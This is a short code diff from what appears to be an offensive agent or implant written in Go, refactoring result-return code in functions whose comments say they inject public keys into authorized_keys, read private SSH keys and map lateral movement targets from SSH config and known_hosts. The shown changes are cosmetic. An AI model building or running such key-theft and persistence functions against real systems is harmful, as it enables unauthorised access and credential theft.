@@ -112,11 +112,7 @@ func sshKeysList(args sshKeysArgs) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output)
 }
 
 // sshKeysAdd injects a public key into authorized_keys
@@ -249,11 +245,7 @@ func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
 		return successf("No private keys found in %s", sshDir)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n")),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n"))
 }
 
 // sshKeysEnumerate scans SSH config and known_hosts to map lateral movement targets.
@@ -362,11 +354,7 @@ func sshKeysEnumerate(args sshKeysArgs) structs.CommandResult {
 		sb.WriteString("\n[Private Keys] None found\n")
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // sshConfigHost holds parsed SSH config entries
